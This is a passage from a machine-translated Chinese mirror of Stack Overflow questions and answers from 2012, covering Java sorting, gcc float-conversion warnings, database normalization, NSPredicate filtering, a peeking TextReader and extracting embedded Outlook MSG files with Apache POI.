正如您已经提到的，您也可以使用 Comparer 类。

如果您从 Student 类实现 Comparator 类，则需要提供 compare 方法的实现，您可以在其中指定逻辑。当您执行 Collections.sort(list, compare) 方法时，将调用此方法。此外，您可以将调试点放在比较方法中，以确保它是如何被调用的。

您的问题的完整示例如下：

```
import java.util.Comparator;
public class Student implements Comparator<Student>{

private String uid;

@Override
public int compare(Student o1, Student o2) {

Integer i1 =  Integer.parseInt(o1.getUid().substring(1)); // Skip the first character U
Integer i2 = Integer.parseInt(o2.getUid().substring(1));  // Skip the first character U
if(i1 > i2 ){
    return 1;
}else if(i1< i2){
    return -1;
}else {
    return 0;
}
}

public String getUid() {
    return uid;
}

public void setUid(String uid) {
    this.uid = uid;
}

}

package test;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class TestSort {

public TestSort(){

Student s1 = new Student();
s1.setUid("U34334");

Student s2 = new Student();
s2.setUid("U64454");

Student s3 = new Student();
s3.setUid("U13344");

List<Student> list = new ArrayList<Student>();
list.add(s1);
list.add(s2);
list.add(s3);

Collections.sort(list, new Student());

for(Student s : list){
    System.out.println(s.getUid());
}

}

public static void main(String[] args){
new TestSort();
}

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T05:25:27.890

尝试这个 ：

```
ArrayList lsStudent = GetStudentData();

lsStudent.Sort((S1, S1) => Convert.ToInt32(S1.UID.Substring(1))
                          .CompareTo(Convert.ToInt32(S2.UID.Substring(1)))); 
```

这将解决您的问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-25T05:25:41.063

让你的`Student`类实现`Comparable`接口：

```
 public class Student implements Comparable<Student> { 
```

并在您的类中实现`compareTo`方法`Student`如下：

```
@Override
public int compareTo(Student s) {
   return UID.compareToIgnoreCase(s.UID);
} 
```

**这里`UID.compareToIgnoreCase(s.UID)`将处理您的字母数字值比较以进行排序。**

然后只需使用`Collections.sort`对您的学生对象集合进行排序。

# java - 是否有可能开发一个完全存在于 JVM 中的操作系统？

> ID：13548417
> 
> 赞同：1
> 
> 时间：2012-11-25T04:55:59.513
> 
> 标签：java, clojure

> **可能重复：**
> [是否可以使用 java 制作操作系统？](https://stackoverflow.com/questions/1988196/is-it-possible-to-make-an-operating-system-using-java)

使用编译成 Java 字节码的语言，例如 Java 或 Clojure，理论上是否有可能编写一个完全在 Java 虚拟机中运行的整个操作系统？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:00:06.460

只有当 CPU 能够执行 Java 字节码时才有可能（请参阅：[Java 处理器](http://en.wikipedia.org/wiki/Java_processor)）。否则，您将需要一些本机机器指令来初始化硬件并解释或 JIT 编译字节码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-25T13:24:17.003

这取决于您所说的“整个操作系统”是什么意思：最可靠的方法是混合操作系统，它使用 Java 作为“用户空间”，并使用 Linux 作为底层操作系统进行硬件访问。

需要考虑的一些事项：

*   显然*JVM 本身需要在某些东西上运行*。这可能是在另一个操作系统上运行的本机 JVM 实现，也可能是硬件，但无论哪种方式，它都需要在堆栈中的某个点使用纯 Java 以外的东西。因此，建议使用 Linux 之类的东西来扮演这个角色。
*   除非您允许链接额外的本机代码，否则您与底层硬件/平台的交互将取决于 Java*运行时环境*中可用的内容（例如，用于文件访问的文件抽象等）。这当然足以实现一个正常工作的 OS shell，但可能不足以实现对许多设备的直接硬件访问，例如。
*   对于现代操作系统，您可能希望将 OpenGL 用于图形（或类似的高性能图形库）。目前这不在标准 Java 运行时环境中，因此您需要找到一个解决方案来包含它（例如[LWJGL](http://www.lwjgl.org/)）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-25T04:58:51.047

有一个（现已放弃）项目，名为[JavaOS](http://en.wikipedia.org/wiki/JavaOS)，它试图按照您的建议去做。

# c - 为什么当我转换为浮点数时 gcc 总是出错？

> ID：13548421
> 
> 赞同：2
> 
> 时间：2012-11-25T04:56:52.413
> 
> 标签：c, opengl, gcc

```
void init(void) 
{
   glClearColor ((float)0.0, (float)0.0, (float)0.0, (float)0.0);
   glShadeModel (GL_FLAT);
} 
```

的参数`glClearColor`是浮点数。但是 gcc 总是给出警告：

```
main.c: In function ‘init’:
main.c:12: warning: passing argument 1 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
main.c:12: warning: passing argument 2 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
main.c:12: warning: passing argument 3 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
main.c:12: warning: passing argument 4 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype 
```

但我只是将一个数字转换为浮点数，而不是双精度数，不知道为什么。

我的操作系统是 mac os 64bit，下面是`makefile`.

```
UNAME := $(shell uname)

ifeq ($(UNAME), Darwin)
    CFLAG := -framework GLUT -framework OpenGL -g -Wall -Wconversion
else
    CFLAG := -lm -lglut -lGL -lGLU -g -Wall
endif

PUB_SRC := util.c plane.c dot.c linked_dots.c controller.c time_data.c
SRC := main.c $(PUB_SRC)
TEST_SRC := test.c $(PUB_SRC)

.PHONY : main
main: $(SRC)
    gcc $(CFLAG) $(SRC)

.PHONY : test
test: $(TEST_SRC)
    gcc $(CFLAG) $(TEST_SRC) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:09:37.913

我认为您使用的是 GCC 3.x？在 GCC 3.x 中，该`-Wconversion`标志记录如下：

> 如果原型导致的类型转换与没有原型时相同参数发生的类型转换不同，则发出警告。这包括定点到浮点的转换，反之亦然，以及改变定点参数的宽度或符号的转换，除非与默认提升相同。
> 
> 此外，如果负整数常量表达式隐式转换为无符号类型，则会发出警告。例如， `x = -1`如果`x`未签名，则警告分配。但不要警告像`(unsigned) -1`.

[[链接](http://gcc.gnu.org/onlinedocs/gcc-3.4.6/gcc/Warning-Options.html#index-Wconversion-248)]

据我了解，此标志的最初目的是帮助检测从传统 C 迁移到 ANSI C 时的潜在问题，以及添加原型可能导致问题的情况。（老实说，在我看来，原型本身触发警告比*使用*函数更有意义，但我可能缺少一些用途。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T05:12:36.417

如果你只是输入一个十进制数字文字，你就声明了一个双精度数。glClearColor 使用浮点数。双精度数可能更长，并且可以包含更多信息，因此通过将其转换为浮点数，可能会丢失信息，这就是您收到警告的原因。您可以通过在数字后添加 af 来指定您想要一个浮点数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-25T05:16:38.803

使用 Apple 提供的 GCC，

```
i686-apple-darwin11-llvm-gcc-4.2 (GCC) 4.2.1 (Based on Apple Inc. build 5658) (LLVM build 2336.11.00) 
```

这段代码：

```
extern void glClearColor(float, float, float, float);
enum { GL_FLAT = 0 };
extern void glShadeModel(int);
extern void init(void);

void init(void) 
{
   glClearColor(0.0F, 0.0F, 0.0F, 0.0F);
   glClearColor(0.0, 0.0, 0.0, 0.0);
   glClearColor((float)0.0, (float)0.0, (float)0.0, (float)0.0);
   glShadeModel(GL_FLAT);
} 
```

编译时出现警告：

```
/usr/bin/gcc -O3 -g -Wall -Wextra -Wmissing-prototypes -Wstrict-prototypes -Wold-style-definition -Wconversion -c xx.c
xx.c: In function ‘init’:
xx.c:8: warning: passing argument 1 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
xx.c:8: warning: passing argument 2 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
xx.c:8: warning: passing argument 3 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
xx.c:8: warning: passing argument 4 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
xx.c:9: warning: passing argument 1 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
xx.c:9: warning: passing argument 2 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
xx.c:9: warning: passing argument 3 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
xx.c:9: warning: passing argument 4 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
xx.c:10: warning: passing argument 1 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
xx.c:10: warning: passing argument 2 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
xx.c:10: warning: passing argument 3 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype
xx.c:10: warning: passing argument 4 of ‘glClearColor’ as ‘float’ rather than ‘double’ due to prototype 
```

使用 GCC 4.7.1 或不使用编译时`-Wconversion`，它可以干净地编译。

您要么必须编辑`makefile`以删除`-Wconversion`警告，要么接受并忽略警告。在两者之间，我会放弃`-Wconversion`。

# database - 遵守数据库规范化

> ID：13548427
> 
> 赞同：1
> 
> 时间：2012-11-25T04:57:26.477
> 
> 标签：database, database-normalization

数据库规范化让我很紧张。假设我有一个寻找共同朋友的场景。我在我的数据库中使用三个字段

`conn_id`, `user_id`,`friend_id`

user_id 代表用户的普通 id，朋友 id 代表相同，我只是试图将每个用户与朋友联系起来。

我现在输入一个用户ID，然后输入朋友ID，**每个记录一个**

例如：

> conn_id | user_id |friend_id
> 
> 1 - us1 - us2
> 
> 2 - us1 - us3
> 
> 3 - us1 - us5
> 
> 4 - us3 - us1
> 
> 5 - us3 - us6
> 
> ........................................等等

它如何不符合数据库规范化？

**编辑**（评论澄清）：

有人让我感到困惑，说我与 user1 -- user2 有一个记录。还有一条 user2 的记录—— user1 ：这不违反规范化，是吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:06:38.947

一个常见的规范化违规是当行已经由其中的某个列或列的组合唯一标识时，为 id 添加序列号。当然，人们总是这样做。有理由保持你的模式标准化，也有很多理由**不**这样做。

看起来就是这种情况。如果 (user_id,friend_id) 的重复条目没有意义，则该列组合可以用作主键。除非序列号本身实际上是有意义的，否则从规范化的角度来看，它可能是无关紧要的。

**更新**

您在下面提出的另一个考虑因素是重复记录的可能性，例如 (u1 -> u2) 和 (u2 -> u1)。这归结为友谊是否可交换的问题。

如果 user2 是 user1 的朋友，那么 user1 也一定是 user2 的朋友吗？如果友谊是可交换的，那么您将拥有重复的记录。如果这类似于社交应用程序，我会假设情况并非如此，并且根本不会是重复记录：它们代表两个完全独立的关系。

# objective-c - 使用 NSSortDescriptor 没有得到正确的排序

> ID：13548429
> 
> 赞同：1
> 
> 时间：2012-11-25T04:58:00.530
> 
> 标签：objective-c, ios, nssortdescriptor

我有一个包含 2 个对象的数组。每个对象都有一个“类型”键。该键的一个值是“resource”，另一个是“crop”。

我想对该数组进行排序并创建一个只包含我需要的类型的对象的新数组。我以为这段代码做到了...

```
-(NSArray*)getItemsOfType:(NSString *) type
{
    NSSortDescriptor *sortDescriptor;
    sortDescriptor = [[NSSortDescriptor alloc] initWithKey:type
                                                 ascending:YES];
    NSArray *sortDescriptors = [NSArray arrayWithObject:sortDescriptor];
    NSArray *sortedArray;
    sortedArray = [templateObjects sortedArrayUsingDescriptors:sortDescriptors];

    return sortedArray;
} 
```

但它似乎所做的只是将当前数组排序为某种顺序。我怎样才能改变那个功能来做我需要的事情？所以我需要使用“initWithKey:ascending:selector:”？

**更新**

我刚刚在上面的代码上方尝试了这段代码......

```
NSPredicate *predicate = [NSPredicate predicateWithFormat: @"templateObjects.type like %@", type];

    NSArray *newArray = [templateObjects filteredArrayUsingPredicate:predicate]; 
```

但是 newArray 似乎是空的？我有一种感觉 @"templateObjects.type" 部分是错误的？

**更新 2**

好的，这段代码可以满足我的需要..

```
-(NSArray*)getItemsOfType:(NSString *) type
{
    NSPredicate *predicate = [NSPredicate predicateWithFormat:@"type CONTAINS[cd] %@", type];

    NSArray *newArray = [templateObjects filteredArrayUsingPredicate:predicate];

    NSSortDescriptor *sortDescriptor;
    sortDescriptor = [[NSSortDescriptor alloc] initWithKey:type
                                                 ascending:YES];
    NSArray *sortDescriptors = [NSArray arrayWithObject:sortDescriptor];
    NSArray *sortedArray;
    sortedArray = [newArray sortedArrayUsingDescriptors:sortDescriptors];

    return sortedArray;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:48:31.380

采用

```
[NSPredicate predicateWithFormat: @"type like %@", type]; 
```

代替

```
[NSPredicate predicateWithFormat: @"templateObjects.type like %@", type]; 
```

所以

```
NSPredicate *predicate = [NSPredicate predicateWithFormat: @"type like %@", type]; 
```

或者

```
NSPredicate *predicate = [NSPredicate predicateWithFormat: @"type CONTAINS[cd] %@", type]; 
```

正如您所说，这将起作用，这两个对象都具有类型键。

# javascript - 检查是否已经选择了产品，然后提醒用户

> ID：13548431
> 
> 赞同：0
> 
> 时间：2012-11-25T04:58:34.267
> 
> 标签：javascript, jquery, html

我有一个表格

```
<form action="" method="POST">
    Quantity1: <input type="text" name="quantity1" id="quantity1">
    Product1: <select name="product1" id="product1"><option value="1">Product 1</option><option value="2">Product 2</option> ... <option value="15">Product 15</option></select>
    Price1: <input type="text" name="price1" id="price1">
    Quantity2: <input type="text" name="quantity2" id="quantity2">
    Product2: <select name="product1" id="product2"><option value="1">Product 1</option><option value="2">Product 2</option> ... <option value="15">Product 15</option></select>
    Price2: <input type="text" name="price2" id="price2">
    .
    .
    .
    Quantity15: <input type="text" name="quantity15" id="quantity15">
    Product15: <select name="product15" id="product15"><option value="1">Product 1</option><option value="2">Product 2</option> ... <option value="15">Product 15</option></select>
    Price15: <input type="text" name="price15" id="price15">
    <input type="submit" value="submit">
</form> 
```

我想检查产品是否已经被选中，然后提醒用户这个被选中。我猜应该是这样的

```
$('select[id^="product"]').change(function() {
     //empty array
     var selected_values = array();
     //check value if it is in array then alert 
     if ($(this).val() IS IN ARRAY) {
         var product = $(this).text();
         alert("you have already select this"+product);
     } else {
         // else save it in array 
         selected_values[] = $(this).val();
     }
} 
```

像这样的[http://jsfiddle.net/GKTYE/](http://jsfiddle.net/GKTYE/)但提交时会发出警报，我想选择更改。请帮忙！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:12:28.267

为警报添加方法。

```
 <script type="text/javascript">
    alertUser (productName, productSize) {
        // some method body
alert("You have selected a product: " + productName + "\r\nSize: " + productSize);
        }
    </script> 
```

在所需的选择标签中，在选择标签属性“on change”下插入方法，提供方法名称。

```
<select name="product1" id="product1" onchange="alertUser('product1', 'Large')"> 
```

这将在用户更改选择时调用 alertUser() 方法。您需要编写一个 if 语句来确定何时选择了所需的选项。您可以编写一个处理多个案例的函数，并通过使用参数来加快脚本编写速度，以提高代码的可用性。

# c# - 为 Windows Phone 8 开发 2D 游戏

> ID：13548438
> 
> 赞同：30
> 
> 时间：2012-11-25T04:59:53.303
> 
> 标签：c#, c++, visual-studio-2012, directx, windows-phone-8

我想为 Windows Phone 8 开发一个 2D 游戏。我白天是一名专业的应用程序开发人员，这似乎是一个有趣的爱好。

但我对尝试开始感到失望。似乎 2D 游戏（绝大多数游戏）没有可用的 API。

Windows Phone 制造商似乎不支持 Direct2D。所以除非你打算制作一个完全 3D 的应用程序，否则你就不走运了。

所以，如果你只是想做一个漂亮的 2D 应用程序，这些是你的选择：

1.  使用 Xaml 和 C# 编写游戏（性能问题？）
2.  使用 Direct3D 编写游戏，但只在一个平面上绘图。
3.  使用 codeplex 上的 DirectX Take Kit。它允许您使用垂死的 XNA 框架的 API 进行开发。

3 号似乎最适合我的比赛。但是，当微软明确表示以后不会支持它时，我讨厌浪费我的时间来学习 XNA api。

2 号可以，但 3D 开发真的很难。我宁愿不必做所有这些来获得 2D 效果。（假设 Direct2D 更容易。我还没有研究过。）

数字 1 似​​乎是最简单的，但我担心如果我的应用程序基于 xaml 渲染而不是 DirectX，它将无法正常运行。

Microsoft 建议的方法是什么？

是谁决定 2D 游戏会被做空？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-25T06:06:36.873

在我看来，Windows 8 和 Windows Phone 8 的游戏开发已经退了一步。在我看来，这主要是由于 XNA 的下降，但这似乎并不是他们专注于简化的事情。

要回答您的问题，虽然学习了另一个 API，例如 XNA，但仍然值得一试。[多亏了 MonoGame](http://monogame.codeplex.com/)，您将能够掌握所学知识并瞄准多个平台。相当多的贡献者都[在致力于 MonoGame](https://github.com/mono/monogame)，我可以看到它存在了相当长的一段时间。

所以，如果你愿意学习 XNA，你可以简单地为 Windows Phone 7 平台制作一个 XNA 2D 游戏。这些标题（微软曾表示）将在 Windows Phone 8** 上运行（并非如此，请参阅更新）。我知道这听起来很不直观，但除非你真的需要使用 WP8 的一些新功能，否则目标 7.1 并使用 XNA。[这是一个完善的框架，非常适合制作 2D 游戏（例如](http://supergiantgames.com/?page_id=242)，查看Bastion ！）。一旦你完成了为 WP7/WP8 制作 2D 游戏，你可以通过引用 MonoGame 来定位 iPhone、Android 和其他平台，只需很少的代码更改。

也许不是一个很好的选择，但另一个要添加到列表中。希望有帮助。

**更新** 原来 MS 真的搞砸了 WP7 到 WP8 的开发。通过上述方法，您仍然可以获得跨平台开发到 iOS、Android 等的优势，但[我对 WP8 没有太大信心，因为兼容性问题](http://www.wpcentral.com/missing-xbox-games-from-windows-phone-8)开始出现，WP7 标题正在被省略WP8 设备的商店。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-25T06:23:47.433

XNA 将部署到 PC、Windows 手机和 Xbox360，Visual Studio 甚至会为您复制项目的不同版本。XNA 是制作快速 2D 游戏的绝佳工具。如果您想将其作为一个测试运行（听起来像您），那么 XNA 就是您的最佳选择。就像 XNA 一样简单，你也可以用着色器做一些非常复杂的事情。我认为你不会很快感到无聊。

如果您决定自己真的喜欢游戏开发，请继续学习 DirectX。在深入了解 3D 游戏开发之前，先从全新的状态开始，并稍微体验一下游戏的古怪之处。与软件世界的其他部分相比，编写视频游戏更像是创建操作系统。无论您的目标平台如何，使用 XNA 让您的脚湿透是您的最佳选择。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-11-19T05:29:19.250

我还想指出，Unity ( [http://www.unity3d.com](http://www.unity3d.com) ) 有用于创建 2D 游戏的工具，并为 Windows Phone 8 和 iOS/Android 发布。为迟到的回复道歉，但这仍然是一个悬而未决的问题...... ;-)

您可以在 Visual Studio 中使用 C# 或 Monodevelop 创建脚本，Unity 已经支持从各种工具（3DS Max、Maya、Photoshop、Gimp 等）创建的模型/纹理。

它是一个专业的游戏引擎，性能方面可以毫无问题地渲染数百万个多边形（个人尝试并测试了 3D），这是应该的。

他们的 2D 工具相对较新，但已经有很多教程，而且 Unity 文档总体上非常好。

（[http://unity3d.com/unity/whats-new](http://unity3d.com/unity/whats-new)）

祝你好运。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-10-29T16:59:47.717

你可以使用[MonoGame](http://www.monogame.net/)。它是一个游戏开发框架，实际上是 XNA 游戏工作室的当前实现。它可以与 Android、Linux 等一起部署到 Windows Phone 8。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-12-25T15:50:14.243

另一种可能性是[Marmalade](https://www.madewithmarmalade.com/marmalade/marmalade-platform)，它包含一个强大的 2D 物理引擎，并且具有跨平台的额外好处，因此您可以将它用于 Android、Apple、Kindle 和其他可能以及 Windows Phone。缺点是它是基于 C++ 的，需要大量的工作，并且没有可以接近 Visual Studio 的 IDE。

# c# - 请告诉我最简单的数据列表分页技术？

> ID：13548439
> 
> 赞同：0
> 
> 时间：2012-11-25T04:59:54.293
> 
> 标签：c#, asp.net, sql, sql-server-2008, pagination

我是 asp.net 的新手，我正在使用 datalist，它由配置`sqldatasource1`并显示太多列，因为我已经编写了`select * from image`. 但我只想要每页 12 张图片，下一步按钮点击从 13 到 24 等等，请告诉我最简单的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T06:28:05.893

如何向您的 SQL proc 发送一个特殊参数。例如，为每个页面请求检索特定的行块；

假设页面大小为 12 条记录/页，那么对于第 1 页，您需要获取*行号在 1 到 12 之间的记录；*例如;

```
SELECT * FROM
(
   SELECT ROW_NUMBER() OVER(ORDER BY YourColumns) NUM,
   * FROM YOURTABLE
) list
WHERE NUM >1AND NUM <12 
```

# c# - TextReader 并查看下一行

> ID：13548443
> 
> 赞同：4
> 
> 时间：2012-11-25T05:00:12.100
> 
> 标签：c#, .net, .net-4.0

我使用从文本文件中读取数据`TextReader`

```
TextReader reader = new StreamReader(stream);
string line;
while ((line = reader.ReadLine()) != null)
 {
   //.......
 } 
```

有时我需要从读者那里偷看下一行（**或几行）。**

我怎么做？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-25T05:10:08.477

编辑：更新以允许任意数量的偷看：

```
public class PeekingStreamReader : StreamReader
{
    private Queue<string> _peeks;

    public PeekingStreamReader(Stream stream) : base(stream)
    {
        _peeks = new Queue<string>();   
    }

    public override string ReadLine()
    {
        if (_peeks.Count > 0)
        {
            var nextLine = _peeks.Dequeue();
            return nextLine;
        }
        return base.ReadLine();
    }

    public string PeekReadLine()
    {
        var nextLine = ReadLine();
        _peeks.Enqueue(nextLine);
        return nextLine;
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-25T05:09:33.117

您需要自己执行此操作；但是，这并不难：

```
public class PeekTextReader {
    string lastLine;
    private readonly TextReader reader;
    public PeekTextReader(TextReader reader) {
        this.reader = reader;
    }
    public string Peek() {
        return lastLine ?? (lastLine = reader.ReadLine());
    }
    public string ReadLine() {
        string res;
        if (lastLine != null) {
            res = lastLine;
            lastLine = null;
        } else {
            res = reader.ReadLine();
        }
        return res;
    }
} 
```

请注意，偷看一次将使线路保持锁定，直到您完成完整的`ReadLine`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-25T05:05:20.350

没有可靠的方法在文本阅读器中向后移动阅读位置。您可以尝试寻找底层流，但这可能是不可能的（如果流不支持寻找），或者如果读取器内部发生任何类型的缓存，则可能无法给出您想要的结果。

最可行的方法是记住最后一行，您可以考虑创建自定义类，该类将扩展具有 PeekString 功能的读取器...但是如果您需要使用其他读取器方法重新读取该字符串，则可能很难正确实现.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-25T05:27:01.573

您可以从文件（ReadAllLines）中读取所有行，然后您可以轻松地对其进行操作。但是看看文件的大小，你可能会使用太多的内存。

# java - 如何使用 Apache POI - HSMF 提取嵌套到另一个 Outlook 消息？

> ID：13548444
> 
> 赞同：4
> 
> 时间：2012-11-25T05:00:38.590
> 
> 标签：java, outlook, apache-poi

我正在使用 Apache POI - HSMF 从 Outlook 的 msg 文件中提取附件。除了嵌套消息外，它工作正常。如果一个味精附加到另一个味精，我可以得到文件。如果消息是嵌套的，我会得到信息，但我需要文件。

```
MAPIMessage msg = new MAPIMessage(fileName)
for(AttachmentChunks attachment : msg.getAttachmentFiles()) {
    if(attachment.attachmentDirectory!=null){
        MAPIMessage nestedMsg attachment.attachmentDirectory.getAsEmbededMessage();
        // now save nestedMsg as a msg-file
    }
} 
```

是否可以将嵌套的消息文件保存为常规的 msg 文件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T19:43:48.177

促进对答案的评论。我可以告诉您如何将嵌入的 Outlook 消息提取到一个新文件中，然后 Apache POI 将愉快地打开该文件。我不太确定的是，嵌入的邮件是否包含 Outlook 期望在独立邮件中找到的所有内容，所以我不能保证生成的文件会在没有问题的情况下使用 Outlook 打开......

首先，在 Outlook 中嵌入资源。根据它的类型，它可能存储在常规字节块中，也可能存储在某种其他类型的特殊块中（例如压缩 RTF），或者它可能是文件中的自包含子目录。嵌入式消息以后一种方式存储。

如果您想提取嵌入的邮件，您需要创建一个新的 OLE2 文件容器，使用`POIFSFileSystem`（所有 Outlook 邮件都存储在 OLE2 容器中）。然后，您需要将源 OLE2 容器中嵌入消息目录的内容复制到新容器的根目录中。最后，将 POIFSFileSystem 写入一个新文件，您的提取就完成了！

您可能想要执行以下操作：

```
 MAPIMessage msg = new MAPIMessage(new NPOIFSFileSytem(new File("test.msg")));
 if (msg.attachmentChunks != null) {
    int number = 0;
    for (AttachmentChunk att : msg.attachmentChunks) {
        if (att.attachmentDirectory != null) {
           number++;
           POIFSFileSystem newMsg = new POIFSFileSystem();
           EntryUtils.copyNodes( att.attachmentDirectory, newMsg.getRoot() );
           FileOutputStream out = new FileOutputStream("embedded-" + number + ".msg");
           newMsg.write(out);
           out.close();
        }
    }
 } 
```

如果 Outlook 有问题，请尝试在 Outlook 中打开源文件，将嵌入的消息保存到新文件，然后使用`org.apache.poi.poifs.dev.POIFSLister`和之`org.apache.poi.poifs.dev.POIFSDump`类的方法比较 Outlook 提取文件和 POI 提取文件，看看是否能发现任何变化这种前景确实....

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2020-06-30T14:28:49.033

里面的代码`TestExtractEmbeddedMSG.java`有点过时了。可以进行单元测试，但进一步调查提取附加的 MSG 文件会更简单一些。

基本上嵌入式MSG文件的提取需要特殊处理，因为嵌入式MSG不是一个简单的BLOB，它只是整个结构化存储容器中的一个子目录。该子目录包含制作嵌入式 MSG 的所有内容，除了我目前知道的两件事：

*   子目录不包含任何“名称 id”属性条目（由其属性集 id 限定范围的非固定 MAPI 属性的映射），它为整个结构化存储全局定义一次
*   属性流的二进制格式与顶级格式略有不同，它遗漏了 8 个字节的保留数据（我不知道微软这样做的原因，但它是根据文档）。

为了将嵌入式 MSG 子目录转换为顶级子目录，需要将顶级“名称 id”属性复制到新的 MSG 中（这可以选择优化，仅嵌入真正引用的条目MSG 被复制，但所有“名称 id”条目都需要解析并使用真正引用的条目重新构建），并且必须使用额外的 8 字节保留数据重新构建属性流。

这是我现在的做法。 `rootmsg`是顶层MSG`attachedmsg`的文件系统根，是嵌入式MSG的文件系统根，可以通过调用`getDirectory`对象`MAPIMessage`获得。`MAPIMessage`可以通过调用对象来检索嵌入`getEmbeddedMessage`的`AttachmentChunks`对象。

构建结构化存储文件系统：

```
 private static POIFSFileSystem rebuildMessageToStream(DirectoryNode rootmsg, DirectoryNode attachedmsg) throws Exception
  {
    //
    // Create new MSG file system and copy all entries.
    //
    POIFSFileSystem newDoc = new POIFSFileSystem();
    //
    // Copy nameid entries from root message.
    //
    if (rootmsg != null) {
      for (Entry entry : rootmsg) {
        if (entry.getName().startsWith(NameIdChunks.NAME)) {
          EntryUtils.copyNodeRecursively(entry, newDoc.getRoot());
        }
      }
    }
    //
    // Copy entries from origin message.
    //
    for (Entry entry : attachedmsg) {
      if (entry.getName().startsWith(PropertiesChunk.NAME) && entry.isDocumentEntry()) {
        if (rootmsg != null) {
          //
          // Rebuild properties stream: Add additional 8 reserved bytes
          // to convert embedded message properties stream to root message properties stream.
          //
          // See MessagePropertiesChunk.writeHeaderData
          //
          DocumentEntry d = (DocumentEntry)entry;
          DocumentInputStream dstream = new DocumentInputStream(d);
          ByteArrayOutputStream rootps = new ByteArrayOutputStream(d.getSize() + 8);
          //
          // Copy first 8 bytes of reserved zeros plus 16 bytes for recipient/attachment counter.
          //
          byte[] data = new byte[24];
          dstream.readFully(data);
          rootps.write(data);
          //
          // Additional 8 bytes of reserved zeros.
          //
          rootps.write(new byte[8]);
          //
          // Properties (remaining data).
          //
          IOUtils.copy(dstream, rootps);
          //
          // Create properties stream entry.
          //
          newDoc.getRoot().createDocument(entry.getName(), new ByteArrayInputStream(rootps.toByteArray()));
          dstream.close();
        }
        else {
          //
          // Copy properties stream unmodified.
          //
          EntryUtils.copyNodeRecursively(entry, newDoc.getRoot());
        }
      }
      else {
        //
        // Copy other entry.
        //
        EntryUtils.copyNodeRecursively(entry, newDoc.getRoot());
      }
    }
    return newDoc;
  } 
```

序列化结构化存储：

```
 try (POIFSFileSystem extractedAttachedMsg = rebuildMessageToStream(rootmsg, attachedmsg)) {
            try (ByteArrayOutputStream extractedAttachedMsgOut = new ByteArrayOutputStream()) {
                extractedAttachedMsg.writeFilesystem(extractedAttachedMsgOut);
                byte[] extratedAttachedMsgRaw = extractedAttachedMsgOut.toByteArray();
                // this byte array can be persisted to disk and opened in MS Outlook
            }
        } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-04-05T14:51:41.017

我为此添加了一些必要的功能到 POI 和一个单元测试，它提取可以在 Outlook 中打开的嵌入式 MSG。命名 id 属性的处理可能不完整（这与验证我的增强功能的单元测试无关）。

[https://svn.apache.org/viewvc/poi/trunk/src/scratchpad/testcases/org/apache/poi/hsmf/TestExtractEmbeddedMSG.java?view=markup](https://svn.apache.org/viewvc/poi/trunk/src/scratchpad/testcases/org/apache/poi/hsmf/TestExtractEmbeddedMSG.java?view=markup)

单元测试示例：

获取附加的味精

```
MAPIMessage attachedMsg = attachments[0].getEmbeddedMessage(); 
```

重建附加味精的方法

```
private POIFSFileSystem rebuildFromAttached(MAPIMessage attachedMsg) throws IOException {
    // Create new MSG and copy properties.
    POIFSFileSystem newDoc = new POIFSFileSystem();
    MessagePropertiesChunk topLevelChunk = new MessagePropertiesChunk(null);
    // Copy attachments and recipients.
    int recipientscount = 0;
    int attachmentscount = 0;
    for (Entry entry : attachedMsg.getDirectory()) {
        if (entry.getName().startsWith(RecipientChunks.PREFIX)) {
            recipientscount++;
            DirectoryEntry newDir = newDoc.createDirectory(entry.getName());
            for (Entry e : ((DirectoryEntry) entry)) {
                EntryUtils.copyNodeRecursively(e, newDir);
            }
        } else if (entry.getName().startsWith(AttachmentChunks.PREFIX)) {
            attachmentscount++;
            DirectoryEntry newDir = newDoc.createDirectory(entry.getName());
            for (Entry e : ((DirectoryEntry) entry)) {
                EntryUtils.copyNodeRecursively(e, newDir);
            }
        }
    }
    // Copy properties from properties stream.
    MessagePropertiesChunk mpc = attachedMsg.getMainChunks().getMessageProperties();
    for (Map.Entry<MAPIProperty, PropertyValue> p : mpc.getRawProperties().entrySet()) {
        PropertyValue val = p.getValue();
        if (!(val instanceof ChunkBasedPropertyValue)) {
